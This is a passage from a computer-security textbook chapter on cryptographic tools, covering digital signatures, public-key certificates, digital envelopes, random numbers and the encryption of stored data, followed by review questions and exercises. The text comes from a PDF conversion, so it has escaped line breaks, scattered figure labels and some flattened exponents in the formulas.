\\r\\nas input to a digital signature generation algorithm that produces a short block that \\r\\nfunctions as a digital signature. Bob sends the message with the signature attached. \\r\\nWhen Alice receives the message plus signature, she (1) calculates a hash value for \\r\\nthe message; (2) provides the hash value and Bob’s public key as inputs to a digital \\r\\nsignature verification algorithm. If the algorithm returns the result that the signature \\r\\nis valid, Alice is assured that the message must have been signed by Bob. No one else \\r\\nFigure 2.7 Simplified Depiction of Essential Elements of Digital Signature Process\\r\\nBob Alice\\r\\nCryptographic\\r\\nhash\\r\\nfunction\\r\\nh\\r\\nCryptographic\\r\\nhash\\r\\nfunction\\r\\nBob’s h\\r\\nprivate\\r\\nkey\\r\\nDigital\\r\\nsignature\\r\\ngeneration\\r\\nalgorithm\\r\\nBob’s\\r\\nsignature\\r\\nfor M\\r\\n(a) Bob signs a message (b) Alice verifies the signature\\r\\nBob’s\\r\\npublic\\r\\nkey\\r\\nDigital\\r\\nsignature\\r\\nverification\\r\\nalgorithm\\r\\nReturn\\r\\nsignature valid\\r\\nor not valid\\r\\nMessage M Message M S \\r\\nMessage M S \\r\\nM02_STAL0611_04_GE_C02.indd 73 10/11/17 2:42 PM\\n\\n\\n74 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nhas Bob’s private key, and therefore no one else could have created a signature that \\r\\ncould be verified for this message with Bob’s public key. In addition, it is impossible to \\r\\nalter the message without access to Bob’s private key, so the message is authenticated \\r\\nboth in terms of source and in terms of data integrity.\\r\\nThe digital signature does not provide confidentiality. That is, the message being \\r\\nsent is safe from alteration, but not safe from eavesdropping. This is obvious in the \\r\\ncase of a signature based on a portion of the message, because the rest of the mes\\ufffesage is transmitted in the clear. Even in the case of complete encryption, there is no \\r\\nprotection of confidentiality because any observer can decrypt the message by using \\r\\nthe sender’s public key.\\r\\nPublic-Key Certificates\\r\\nOn the face of it, the point of public-key encryption is that the public key is public. Thus, \\r\\nif there is some broadly accepted public-key algorithm, such as RSA, any participant \\r\\ncan send his or her public key to any other participant or broadcast the key to the com\\ufffemunity at large. Although this approach is convenient, it has a major weakness. Anyone \\r\\ncan forge such a public announcement. That is, some user could pretend to be Bob and \\r\\nsend a public key to another participant or broadcast such a public key. Until such time \\r\\nas Bob discovers the forgery and alerts other participants, the forger is able to read all \\r\\nencrypted messages intended for Bob and can use the forged keys for authentication.\\r\\nThe solution to this problem is the public-key certificate. In essence, a certifi\\ufffecate consists of a public key plus a user ID of the key owner, with the whole block \\r\\nsigned by a trusted third party. The certificate also includes some information about \\r\\nthe third party plus an indication of the period of validity of the certificate. Typically, \\r\\nthe third party is a certificate authority (CA) that is trusted by the user community, \\r\\nsuch as a government agency or a financial institution. A user can present his or her \\r\\npublic key to the authority in a secure manner and obtain a signed certificate. The \\r\\nuser can then publish the certificate. Anyone needing this user’s public key can obtain \\r\\nthe certificate and verify that it is valid by means of the attached trusted signature. \\r\\nFigure 2.8 illustrates the process.\\r\\nThe key steps can be summarized as follows:\\r\\n1. User software (client) creates a pair of keys: one public and one private.\\r\\n2. Client prepares an unsigned certificate that includes the user ID and user’s \\r\\npublic key.\\r\\n3. User provides the unsigned certificate to a CA in some secure manner. This might \\r\\nrequire a face-to-face meeting, the use of registered e-mail, or happen via a Web \\r\\nform with e-mail verification.\\r\\n4. CA creates a signature as follows:\\r\\na. CA uses a hash function to calculate the hash code of the unsigned certifi\\ufffecate. A hash function is one that maps a variable-length data block or mes\\ufffesage into a fixed-length value called a hash code, such as SHA family that \\r\\nwe will discuss in Sections 2.2 and 21.1.\\r\\nb. CA generates digital signature using the CA’s private key and a signature \\r\\ngeneration algorithm.\\r\\n5. CA attaches the signature to the unsigned certificate to create a signed certificate.\\r\\nM02_STAL0611_04_GE_C02.indd 74 10/11/17 2:42 PM\\n\\n\\n2.4 / DIGITAL SIGNATURES AND KEY MANAGEMENT 75\\r\\n6. CA returns the signed certificate to client.\\r\\n7. Client may provide the signed certificate to any other user.\\r\\n8. Any user may verify that the certificate is valid as follows:\\r\\na. User calculates the hash code of certificate (not including signature).\\r\\nb. User verifies digital signature using CA’s public key and the signature veri\\ufffefication algorithm. The algorithm returns a result of either signature valid \\r\\nor invalid.\\r\\nOne scheme has become universally accepted for formatting public-key \\r\\ncertificates: the X.509 standard. X.509 certificates are used in most network security \\r\\napplications, including IP Security (IPsec), Transport Layer Security (TLS), Secure \\r\\nShell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We will \\r\\nexamine most of these applications in Part Five.\\r\\nSymmetric Key Exchange Using Public-Key Encryption\\r\\nWith symmetric encryption, a fundamental requirement for two parties to communi\\ufffecate securely is that they share a secret key. Suppose Bob wants to create a messaging \\r\\napplication that will enable him to exchange e-mail securely with anyone who has \\r\\naccess to the Internet, or to some other network that the two of them share. Suppose \\r\\nBob wants to do this using symmetric encryption. With symmetric encryption, Bob \\r\\nand his correspondent, say, Alice, must come up with a way to share a unique secret \\r\\nkey that no one else knows. How are they going to do that? If Alice is in the next \\r\\nroom from Bob, Bob could generate a key and write it down on a piece of paper or \\r\\nFigure 2.8 Public-Key Certificate Use\\r\\nUnsigned certificate:\\r\\ncontains user ID,\\r\\nuser’s public key,\\r\\nas well as information\\r\\nconcerning the CA\\r\\nSigned certificate Generate hash\\r\\ncode of unsigned\\r\\ncertificate\\r\\nGenerate hash code\\r\\nof certificate not\\r\\nincluding signature\\r\\nGenerate digital signature\\r\\nusing CA’s private key\\r\\nH\\r\\nH\\r\\nBob’s ID\\r\\ninformation\\r\\nCA\\r\\ninformation\\r\\nBob’s public key\\r\\nSG SV\\r\\nVerify digital signature\\r\\nusing CA’s public key\\r\\nReturn signature\\r\\nvalid or not valid\\r\\nUse certificate to\\r\\nverify Bob’s public key\\r\\nCreate signed\\r\\ndigital certificate\\r\\nM02_STAL0611_04_GE_C02.indd 75 10/11/17 2:42 PM\\n\\n\\n76 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nstore it on a disk or thumb drive and hand it to Alice. But if Alice is on the other \\r\\nside of the continent or the world, what can Bob do? He could encrypt this key using \\r\\nsymmetric encryption and e-mail it to Alice, but this means that Bob and Alice must \\r\\nshare a secret key to encrypt this new secret key. Furthermore, Bob and everyone \\r\\nelse who uses this new e-mail package faces the same problem with every potential \\r\\ncorrespondent: Each pair of correspondents must share a unique secret key.\\r\\nOne approach is the use of Diffie–Hellman key exchange. This approach \\r\\nis indeed widely used. However, it suffers the drawback that, in its simplest form, \\r\\nDiffie–Hellman provides no authentication of the two communicating partners. There \\r\\nare variations to Diffie–Hellman that overcome this problem. In addition, there are \\r\\nprotocols using other public-key algorithms that achieve the same objective.\\r\\nDigital Envelopes\\r\\nAnother application in which public-key encryption is used to protect a symmetric \\r\\nkey is the digital envelope, which can be used to protect a message without needing \\r\\nto first arrange for sender and receiver to have the same secret key. The technique \\r\\nis referred to as a digital envelope, which is the equivalent of a sealed envelope con\\ufffetaining an unsigned letter. The general approach is shown in Figure 2.9. Suppose Bob \\r\\nFigure 2.9 Digital Envelopes\\r\\nRandom\\r\\nsymmetric\\r\\nkey\\r\\nReceiver’s\\r\\npublic\\r\\nkey\\r\\nEncrypted\\r\\nsymmetric\\r\\nkey\\r\\nEncrypted\\r\\nmessage\\r\\nEncrypted\\r\\nmessage\\r\\nDigital\\r\\nenvelope\\r\\n(a) Creation of a digital envelope\\r\\nE\\r\\nE\\r\\nMessage\\r\\nRandom\\r\\nsymmetric\\r\\nkey\\r\\nReceiver’s\\r\\nprivate\\r\\nkey\\r\\nEncrypted\\r\\nsymmetric\\r\\nkey\\r\\n(b) Opening a digital envelope\\r\\nD\\r\\nD\\r\\nDigital\\r\\nenvelope\\r\\nMessage\\r\\nM02_STAL0611_04_GE_C02.indd 76 10/11/17 2:42 PM\\n\\n\\n2.5 / RANDOM AND PSEUDORANDOM NUMBERS 77\\r\\nwishes to send a confidential message to Alice, but they do not share a symmetric \\r\\nsecret key. Bob does the following:\\r\\n1. Prepare a message.\\r\\n2. Generate a random symmetric key that will be used this one time only.\\r\\n3. Encrypt that message using symmetric encryption the one-time key.\\r\\n4. Encrypt the one-time key using public-key encryption with Alice’s public key.\\r\\n5. Attach the encrypted one-time key to the encrypted message and send it to \\r\\nAlice.\\r\\nOnly Alice is capable of decrypting the one-time key and therefore of recov\\ufffeering the original message. If Bob obtained Alice’s public key by means of Alice’s \\r\\npublic-key certificate, then Bob is assured that it is a valid key.\\r\\n2.5 RANDOM AND PSEUDORANDOM NUMBERS\\r\\nRandom numbers play an important role in the use of encryption for various net\\ufffework security applications. We provide a brief overview in this section. The topic is \\r\\nexamined in detail in Appendix D.\\r\\nThe Use of Random Numbers\\r\\nA number of network security algorithms based on cryptography make use of ran\\ufffedom numbers. For example:\\r\\n• Generation of keys for the RSA public-key encryption algorithm (to be \\r\\ndescribed in Chapter 21) and other public-key algorithms.\\r\\n• Generation of a stream key for symmetric stream cipher.\\r\\n• Generation of a symmetric key for use as a temporary session key or in creating \\r\\na digital envelope.\\r\\n• In a number of key distribution scenarios, such as Kerberos (to be described in\\r\\nChapter 23), random numbers are used for handshaking to prevent replay attacks.\\r\\n• Session key generation, whether done by a key distribution center or by one \\r\\nof the principals.\\r\\nThese applications give rise to two distinct and not necessarily compatible \\r\\nrequirements for a sequence of random numbers: randomness, and unpredictability.\\r\\nRANDOMNESS Traditionally, the concern in the generation of a sequence of alleg\\ufffeedly random numbers has been that the sequence of numbers be random in some \\r\\nwell-defined statistical sense. The following two criteria are used to validate that a \\r\\nsequence of numbers is random:\\r\\n• Uniform distribution: The distribution of numbers in the sequence should be \\r\\nuniform; that is, the frequency of occurrence of each of the numbers should be \\r\\napproximately the same.\\r\\n• Independence: No one value in the sequence can be inferred from the others.\\r\\nM02_STAL0611_04_GE_C02.indd 77 10/11/17 2:42 PM\\n\\n\\n78 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nAlthough there are well-defined tests for determining that a sequence of num\\ufffebers matches a particular distribution, such as the uniform distribution, there is no \\r\\nsuch test to “prove” independence. Rather, a number of tests can be applied to dem\\ufffeonstrate if a sequence does not exhibit independence. The general strategy is to apply \\r\\na number of such tests until the confidence that independence exists is sufficiently \\r\\nstrong.\\r\\nIn the context of our discussion, the use of a sequence of numbers that appear \\r\\nstatistically random often occurs in the design of algorithms related to cryptography. \\r\\nFor example, a fundamental requirement of the RSA public-key encryption scheme is \\r\\nthe ability to generate prime numbers. In general, it is difficult to determine if a given \\r\\nlarge number N is prime. A brute-force approach would be to divide N by every odd \\r\\ninteger less than 1N. If N is on the order, say, of 10150, a not uncommon occurrence in \\r\\npublic-key cryptography, such a brute-force approach, is beyond the reach of human \\r\\nanalysts and their computers. However, a number of effective algorithms exist that \\r\\ntest the primality of a number by using a sequence of randomly chosen integers as\\r\\ninput to relatively simple computations. If the sequence is sufficiently long (but far, far \\r\\nless than 210150), the primality of a number can be determined with near certainty. This \\r\\ntype of approach, known as randomization, crops up frequently in the design of algo\\uffferithms. In essence, if a problem is too hard or time-consuming to solve exactly, a \\r\\nsimpler, shorter approach based on randomization is used to provide an answer with \\r\\nany desired level of confidence.\\r\\nUNPREDICTABILITY In applications such as reciprocal authentication and session \\r\\nkey generation, the requirement is not so much that the sequence of numbers be \\r\\nstatistically random, but that the successive members of the sequence are unpre\\ufffedictable. With “true” random sequences, each number is statistically independent of \\r\\nother numbers in the sequence and therefore unpredictable. However, as discussed \\r\\nshortly, true random numbers are not always used; rather, sequences of numbers that \\r\\nappear to be random are generated by some algorithm. In this latter case, care must \\r\\nbe taken that an opponent is not be able to predict future elements of the sequence \\r\\non the basis of earlier elements.\\r\\nRandom versus Pseudorandom\\r\\nCryptographic applications typically make use of algorithmic techniques for ran\\ufffedom number generation. These algorithms are deterministic and therefore produce \\r\\nsequences of numbers that are not statistically random. However, if the algorithm is \\r\\ngood, the resulting sequences will pass many reasonable tests of randomness. Such \\r\\nnumbers are referred to as pseudorandom numbers.\\r\\nYou may be somewhat uneasy about the concept of using numbers generated \\r\\nby a deterministic algorithm as if they were random numbers. Despite what might \\r\\nbe called philosophical objections to such a practice, it generally works. That is, \\r\\nunder most circumstances, pseudorandom numbers will perform as well as if they \\r\\nwere random for a given use. The phrase “as well as” is unfortunately subjective, but \\r\\nthe use of pseudorandom numbers is widely accepted. The same principle applies \\r\\nin statistical applications, in which a statistician takes a sample of a population and \\r\\nassumes the results will be approximately the same as if the whole population were \\r\\nmeasured.\\r\\nM02_STAL0611_04_GE_C02.indd 78 10/11/17 2:42 PM\\n\\n\\n2.6 / PRACTICAL APPLICATION: ENCRYPTION OF STORED DATA 79\\r\\nA true random number generator (TRNG) uses a nondeterministic source to \\r\\nproduce randomness. Most operate by measuring unpredictable natural processes, \\r\\nsuch as pulse detectors of ionizing radiation events, gas discharge tubes, and leaky \\r\\ncapacitors. Intel has developed a commercially available chip that samples ther\\ufffemal noise by amplifying the voltage measured across undriven resistors [JUN99]. \\r\\nLavaRnd is an open source project for creating truly random numbers using inex\\ufffepensive cameras, open source code, and inexpensive hardware. The system uses a \\r\\nsaturated charge-coupled device (CCD) in a light-tight can as a chaotic source to \\r\\nproduce the seed. Software processes the result into truly random numbers in a vari\\ufffeety of formats. The first commercially available TRNG that achieves bit production \\r\\nrates comparable with that of PRNGs is the Intel digital random number generator \\r\\n(DRNG) [TAYL11], offered on new multicore chips since May 2012.\\r\\n2.6 PRACTICAL APPLICATION: ENCRYPTION \\r\\nOF STORED DATA\\r\\nOne of the principal security requirements of a computer system is the protection of \\r\\nstored data. Security mechanisms to provide such protection include access control, \\r\\nintrusion detection, and intrusion prevention schemes, all of which are discussed in \\r\\nthis book. The book also describes a number of technical means by which these vari\\ufffeous security mechanisms can be made vulnerable. But beyond technical approaches, \\r\\nthese approaches can become vulnerable because of human factors. We list a few \\r\\nexamples here, based on [ROTH05]:\\r\\n• In December of 2004, Bank of America employees backed up then sent to its \\r\\nbackup data center tapes containing the names, addresses, bank account num\\ufffebers, and Social Security numbers of 1.2 million government workers enrolled \\r\\nin a charge-card account. None of the data were encrypted. The tapes never \\r\\narrived, and indeed have never been found. Sadly, this method of backing up \\r\\nand shipping data is all too common. As an another example, in April of 2005, \\r\\nAmeritrade blamed its shipping vendor for losing a backup tape containing \\r\\nunencrypted information on 200,000 clients.\\r\\n• In April of 2005, San Jose Medical group announced that someone had physi\\ufffecally stolen one of its computers and potentially gained access to 185,000 unen\\ufffecrypted patient records.\\r\\n• There have been countless examples of laptops lost at airports, stolen from a \\r\\nparked car, or taken while the user is away from his or her desk. If the data on \\r\\nthe laptop’s hard drive are unencrypted, all of the data are available to the thief.\\r\\nAlthough it is now routine for businesses to provide a variety of protections, \\r\\nincluding encryption, for information that is transmitted across networks, via the \\r\\nInternet, or via wireless devices, once data are stored locally (referred to as data at \\r\\nrest), there is often little protection beyond domain authentication and operating \\r\\nsystem access controls. Data at rest are often routinely backed up to secondary stor\\ufffeage such as optical media, tape or removable disk, archived for indefinite periods. \\r\\nFurther, even when data are erased from a hard disk, until the relevant disk sectors \\r\\nM02_STAL0611_04_GE_C02.indd 79 10/11/17 2:42 PM\\n\\n\\n80 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nare reused, the data are recoverable. Thus, it becomes attractive, and indeed should \\r\\nbe mandatory, to encrypt data at rest and combine this with an effective encryption \\r\\nkey management scheme.\\r\\nThere are a variety of ways to provide encryption services. A simple approach \\r\\navailable for use on a laptop is to use a commercially available encryption package \\r\\nsuch as Pretty Good Privacy (PGP). PGP enables a user to generate a key from a \\r\\npassword and then use that key to encrypt selected files on the hard disk. The PGP \\r\\npackage does not store the password. To recover a file, the user enters the password, \\r\\nPGP generates the key, and then decrypts the file. So long as the user protects his \\r\\nor her password and does not use an easily guessable password, the files are fully \\r\\nprotected while at rest. Some more recent approaches are listed in [COLL06]:\\r\\n• Back-end appliance: This is a hardware device that sits between servers and stor\\ufffeage systems and encrypts all data going from the server to the storage system, and \\r\\ndecrypts data going in the opposite direction. These devices encrypt data at close \\r\\nto wire speed, with very little latency. In contrast, encryption software on servers \\r\\nand storage systems slows backups. A system manager configures the appliance \\r\\nto accept requests from specified clients, for which unencrypted data are supplied.\\r\\n• Library-based tape encryption: This is provided by means of a co-processor \\r\\nboard embedded in the tape drive and tape library hardware. The co-processor \\r\\nencrypts data using a nonreadable key configured into the board. The tapes \\r\\ncan then be sent off-site to a facility that has the same tape drive hardware. The \\r\\nkey can be exported via secure e-mail, or a small flash drive that is transported \\r\\nsecurely. If the matching tape drive hardware co-processor is not available at \\r\\nthe other site, the target facility can use the key in a software decryption pack\\ufffeage to recover the data.\\r\\n• Background laptop and PC data encryption: A number of vendors offer soft\\ufffeware products that provide encryption that is transparent to the application \\r\\nand the user. Some products encrypt all or designated files and folders. Other \\r\\nproducts, such as Windows BitLocker and MacOS FileVault, encrypt an entire \\r\\ndisk or disk image located on either the user’s hard drive or maintained on a \\r\\nnetwork storage device, with all data on the virtual disk encrypted. Various key \\r\\nmanagement solutions are offered to restrict access to the owner of the data.\\r\\n2.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nAdvanced Encryption \\r\\nStandard (AES)\\r\\nasymmetric encryption\\r\\nauthentication\\r\\nbrute-force attack\\r\\nciphertext\\r\\ncollision resistant\\r\\nconfidentiality\\r\\ncryptanalysis\\r\\nData Encryption Standard \\r\\n(DES)\\r\\ndata integrity\\r\\nDecryption\\r\\nDiffie–Hellman key exchange\\r\\ndigital signature\\r\\nDigital Signature Standard \\r\\n(DSS)\\r\\nelliptic curve cryptography\\r\\nM02_STAL0611_04_GE_C02.indd 80 10/11/17 2:42 PM\\n\\n\\n2.7 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 81\\r\\nReview Questions\\r\\n2.1 How is cryptanalysis different from brute-force attack?\\r\\n2.2 List and briefly explain the different approaches to attacking a symmetric encryption \\r\\nscheme.\\r\\n2.3 What are the two principal requirements for the secure use of symmetric encryption?\\r\\n2.4 List the two important aspects of data authentication.\\r\\n2.5 What is one-way hash function?\\r\\n2.6 Briefly describe the three schemes illustrated in Figure 2.3.\\r\\n2.7 What properties must a hash function have to be useful for message authentication?\\r\\n2.8 What are the principal ingredients of a public-key cryptosystem?\\r\\n2.9 List and briefly define three uses of a public-key cryptosystem.\\r\\n2.10 What advantage might elliptic curve cryptography (ECC) have over RSA?\\r\\n2.11 Do digital signatures provide confidentiality?\\r\\n2.12 What is a public-key certificate?\\r\\n2.13 What are three different ways in which random numbers are used in cryptography?\\r\\nProblems\\r\\n2.1 Typically, in practice, the length of the message is greater than the block size of the \\r\\nencryption algorithm. The simplest approach to handle such encryption is known as \\r\\nelectronic codebook (ECB) mode. Explain this mode. Mention a scenario where it \\r\\ncannot be applied. Explain briefly why it is not a secure mode of encryption.\\r\\n2.2 This problem uses a real-world example of a symmetric cipher, from an old U.S. \\r\\nSpecial Forces manual (public domain). The document, filename Special Forces.pdf, is \\r\\navailable at box.com/CompSec4e.\\r\\na. Using the two keys (memory words) cryptographic and network security, encrypt \\r\\nthe following message:\\r\\nBe at the third pillar from the left outside the lyceum theatre tonight at \\r\\nseven. If you are distrustful bring two friends.\\r\\nMake reasonable assumptions about how to treat redundant letters and excess let\\ufffeters in the memory words and how to treat spaces and punctuation. Indicate what \\r\\nyour assumptions are.\\r\\nNote: The message is from the Sherlock Holmes novel The Sign of Four.\\r\\nb. Decrypt the ciphertext. Show your work.\\r\\nc. Comment on when it would be appropriate to use this technique and what its \\r\\nadvantages are.\\r\\nencryption\\r\\nhash function\\r\\nkeystream\\r\\nmessage authentication\\r\\nmessage authentication \\r\\ncode (MAC)\\r\\nmodes of operation\\r\\none-way hash function\\r\\nplaintext\\r\\npreimage resistant\\r\\nprivate key\\r\\npseudorandom number\\r\\npublic key\\r\\npublic-key certificate\\r\\npublic-key encryption\\r\\nrandom number\\r\\nRSA\\r\\nsecond preimage resistant\\r\\nsecret key\\r\\nsecure hash algorithm (SHA)\\r\\nsecure hash function\\r\\nstrong collision resistant\\r\\nsymmetric encryption\\r\\ntriple DES\\r\\nweak collision resistant\\r\\nM02_STAL0611_04_GE_C02.indd 81 10/11/17 2:42 PM\\n\\n\\n82 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\n2.3 Consider a very simple symmetric block encryption algorithm, in which 64-bits blocks \\r\\nof plaintext are encrypted using a 128-bit key. Encryption is defined as\\r\\nC = (P ⊕ K0) Ä K1\\r\\nwhere C = ciphertext; K = secret key; K0 = leftmost 64 bits of K; K1 = rightmost\\r\\n64 bits of K, ⊕ = bitwise exclusive or; and Ä is addition mod 264.\\r\\na. Show the decryption equation. That is, show the equation for P as a function of C, \\r\\nK1 and K2.\\r\\nb. Suppose an adversary has access to two sets of plaintexts and their corresponding \\r\\nciphertexts and wishes to determine K. We have the two equations:\\r\\nC = (P ⊕ K0) Ä K1; C′ = (P′ ⊕ K0) Ä K1\\r\\nFirst, derive an equation in one unknown (e.g., K0). Is it possible to proceed further \\r\\nto solve for K0?\\r\\n2.4 Perhaps the simplest “serious” symmetric block encryption algorithm is the Tiny \\r\\nEncryption Algorithm (TEA). TEA operates on 64-bit blocks of plaintext using a \\r\\n128-bit key. The plaintext is divided into two 32-bit blocks (L0, R0), and the key is \\r\\ndivided into four 32-bit blocks (K0, K1, K2, K3). Encryption involves repeated applica\\ufffetion of a pair of rounds, defined as follows for rounds i and i + 1:\\r\\nLi = Ri-1\\r\\nRi = Li-1 Ä F(Ri-1, K0, K1, di\\r\\n)\\r\\nLi+1 = Ri\\r\\nRi+1 = Li Ä F(Ri\\r\\n, K2, K3, di+1)\\r\\nwhere F is defined as\\r\\nF(M, Kj\\r\\n, Kk, di\\r\\n) = ((M V 4) Ä Kj\\r\\n) ⊕ ((M W 5) Ä Kk) ⊕ (M + di\\r\\n)\\r\\nand where the logical shift of x by y bits is denoted by x V y; the logical right shift x\\r\\nby y bits is denoted by x W y; and di\\r\\n is a sequence of predetermined constants.\\r\\na. Comment on the significance and benefit of using the sequence of constants.\\r\\nb. Illustrate the operation of TEA using a block diagram or flow chart type of \\r\\ndepiction.\\r\\nc. If only one pair of rounds is used, then the ciphertext consists of the 64-bit block \\r\\n(L2, R2). For this case, express the decryption algorithm in terms of equations.\\r\\nd. Repeat part (c) using an illustration similar to that used for part (b).\\r\\n2.5 In this problem, we will compare the security services that are provided by digital \\r\\nsignatures (DS) and message authentication codes (MAC). We assume Oscar is able \\r\\nto observe all messages sent from Alice to Bob and vice versa. Oscar has no knowl\\ufffeedge of any keys but the public one in case of DS. State whether and how (i) DS and \\r\\n(ii) MAC protect against each attack. The value auth(x) is computed with a DS or a \\r\\nMAC algorithm, respectively.\\r\\na. (Message integrity) Alice sends a message x = ;Transfer $1000 to Mark< in the \\r\\nclear and also sends auth(x) to Bob. Oscar intercepts the message and replaces \\r\\n“Mark” with “Oscar.” Will Bob detect this?\\r\\nb. (Replay) Alice sends a message x = ;Transfer $1000 to Oscar< in the clear and \\r\\nalso sends auth(x) to Bob. Oscar observes the message and signature and sends \\r\\nthem 100 times to Bob. Will Bob detect this?\\r\\nc. (Sender authentication with cheating third party) Oscar claims that he sent some \\r\\nmessage x with a valid auth(x) to Bob but Alice claims the same. Can Bob clear \\r\\nthe question in either case?\\r\\nd. (Authentication with Bob cheating) Bob claims that he received a message x \\r\\nwith a valid signature auth(x) from Alice (e.g., “Transfer $1000 from Alice to \\r\\nBob”) but Alice claims she has never sent it. Can Alice clear this question in \\r\\neither case?\\r\\nM02_STAL0611_04_GE_C02.indd 82 10/11/17 2:42 PM\\n\\n\\n2.7 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 83\\r\\n2.6 Suppose H(M) is a cryptographic hash function that maps a message of an arbitrary bit \\r\\nlength on to an n-bit hash value. Briefly explain the primary security requirements of the \\r\\nhash function H. Assume that H outputs 16-bit hash values. How many random messages \\r\\nwould be required to find two different messages M and M\\' such that H(M) = H(M′).\\r\\n2.7 This problem introduces a hash function similar in spirit to SHA that operates on let\\ufffeters instead of binary data. It is called the toy tetragraph hash (tth).8\\r\\n Given a message \\r\\nconsisting of a sequence of letters, tth produces a hash value consisting of four letters. \\r\\nFirst, tth divides the message into blocks of 16 letters, ignoring spaces, punctuation, \\r\\nand capitalization. If the message length is not divisible by 16, it is padded out with \\r\\nnulls. A four-number running total is maintained that starts out with the value (0, 0, 0, \\r\\n0); this is input to a function, known as a compression function, for processing the first \\r\\nblock. The compression function consists of two rounds. Round 1: Get the next block \\r\\nof text and arrange it as a row-wise 4 * 4 block of text and convert it to numbers \\r\\n(A = 0, B = 1), for example, for the block ABCDEFGHIJKLMNOP, we have\\r\\nABCD\\r\\nE FGH\\r\\nI JKL\\r\\nMNO P\\r\\n0123\\r\\n4567\\r\\n8 9 10 11\\r\\n12 13 14 15\\r\\nThen, add each column mod 26 and add the result to the running total, mod 26. In this \\r\\nexample, the running total is (24, 2, 6, 10). Round 2: Using the matrix from round 1, \\r\\nrotate the first row left by 1, second row left by 2, third row left by 3, and reverse the \\r\\norder of the fourth row. In our example,\\r\\nBCDA\\r\\nGHE F\\r\\nL I JK\\r\\nP ONM\\r\\n1230\\r\\n6745\\r\\n11 8 9 10\\r\\n15 14 13 12\\r\\nNow, add each column mod 26 and add the result to the running total. The new run\\ufffening total is (5, 7, 9, 11). This running total is now the input into the first round of the \\r\\ncompression function for the next block of text. After the final block is processed, \\r\\nconvert the final running total to letters. For example, if the message is ABCDEF\\ufffeGHIJKLMNOP, then the hash is FHJL.\\r\\na. Draw figures of the overall tth logic and the compression function logic.\\r\\nb. Calculate the hash function for the 48-letter message “I leave twenty million \\r\\ndollars to my friendly cousin Bill.”\\r\\nc. To demonstrate the weakness of tth, find a 48-letter block that produces the same \\r\\nhash as that just derived. Hint: Use lots of As.\\r\\n2.8 Prior to the discovery of any specific public-key schemes, such as RSA, an existence \\r\\nproof was developed whose purpose was to demonstrate that public-key encryption \\r\\nis possible in theory. Consider the functions f1(x1) = z1; f2(x2, y2) = z2; f3(x3, y3) = z3,\\r\\nwhere all values are integers with 1 … xi\\r\\n, yi\\r\\n, zi … N. Function f1 can be represented \\r\\nby a vector M1 of length N, in which the kth entry is the value of f1(k). Similarly, \\r\\n8\\r\\nI thank William K. Mason and The American Cryptogram Association for providing this example.\\r\\nM02_STAL0611_04_GE_C02.indd 83 10/11/17 2:42 PM\\n\\n\\n84 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nf2 and f3 can be represented by N * N matrices M2 and M3. The intent is to represent \\r\\nthe encryption/decryption process by table look-ups for tables with very large values \\r\\nof N. Such tables would be impractically huge but could, in principle, be constructed. \\r\\nThe scheme works as follows: Construct M1 with a random permutation of all integers \\r\\nbetween 1 and N; that is, each integer appears exactly once in M1. Construct M2 so \\r\\neach row contains a random permutation of the first N integers. Finally, fill in M3 to \\r\\nsatisfy the following condition:\\r\\nf3(f2(f1(k), p), k) = p for all k, p with 1 … k, p … N\\r\\nIn words,\\r\\n1. M1 takes an input k and produces an output x.\\r\\n2. M2 takes inputs x and p giving output z.\\r\\n3. M3 takes inputs z and k and produces p.\\r\\nThe three tables, once constructed, are made public.\\r\\na. It should be clear that it is possible to construct M3 to satisfy the preceding condi\\ufffetion. As an example, fill in M3 for the following simple case:\\r\\n5\\r\\n4\\r\\n2\\r\\n3\\r\\n1\\r\\nM1 = M2 = M3 =\\r\\n5\\r\\n4\\r\\n1\\r\\n3\\r\\n2\\r\\n2\\r\\n2\\r\\n3\\r\\n1\\r\\n5\\r\\n3\\r\\n5\\r\\n2\\r\\n4\\r\\n3\\r\\n4\\r\\n1\\r\\n4\\r\\n2\\r\\n4\\r\\n1\\r\\n3\\r\\n5\\r\\n5\\r\\n1\\r\\n5\\r\\n1\\r\\n3\\r\\n4\\r\\n2\\r\\nConvention: The ith element of M1 corresponds to k = i. The ith row of M2 cor\\uffferesponds to x = i; the jth column of M2 corresponds to p = j. The ith row of M3\\r\\ncorresponds to z = i; the jth column of M3 corresponds to k = j. We can look at \\r\\nthis in another way. The ith row of M1 corresponds to the ith column of M3. The \\r\\nvalue of the entry in the ith row selects a row of M2. The entries in the selected M3\\r\\ncolumn are derived from the entries in the selected M2 row. The first entry in the \\r\\nM2 row dictates where the value 1 goes in the M3 column. The second entry in the \\r\\nM2 row dictates where the value 2 goes in the M3 column, and so on.\\r\\nb. Describe the use of this set of tables to perform encryption and decryption between \\r\\ntwo users.\\r\\nc. Argue that this is a secure scheme.\\r\\n2.9 Construct a figure similar to Figure 2.9 that includes a digital signature to authenticate \\r\\nthe message in the digital envelope.\\r\\nM02_STAL0611_04_GE_C02.indd 84 10/11/17 2:42 PM\\n\\n\\n85\\r\\n3.1 Digital User Authentication Principles\\r\\nA Model for Digital User Authentication\\r\\nMeans of Authentication\\r\\nRisk Assessment for User Authentication\\r\\n3.2 Password-Based Authentication\\r\\nThe Vulnerability of Passwords\\r\\nThe Use of Hashed Passwords\\r\\nPassword Cracking of User-Chosen Passwords\\r\\nPassword File Access Control\\r\\nPassword Selection Strategies\\r\\n3.3 Token-Based Authentication\\r\\nMemory Cards\\r\\nSmart Cards\\r\\nElectronic Identify Cards\\r\\n3.4 Biometric Authentication\\r\\nPhysical Characteristics Used in Biometric Applications\\r\\nOperation of a Biometric Authentication System\\r\\nBiometric Accuracy\\r\\n3.5 Remote User Authentication\\r\\nPassword Protocol\\r\\nToken Protocol\\r\\nStatic Biometric Protocol\\r\\nDynamic Biometric Protocol\\r\\n3.6 Security Issues for User Authentication\\r\\n3.7 Practical Application: An Iris Biometric System\\r\\n3.8 Case Study: Security Problems for ATM Systems\\r\\n3.9 Key Terms, Review Questions, and Problems\\r\\nUser Authentication\\r\\nCHAPTER 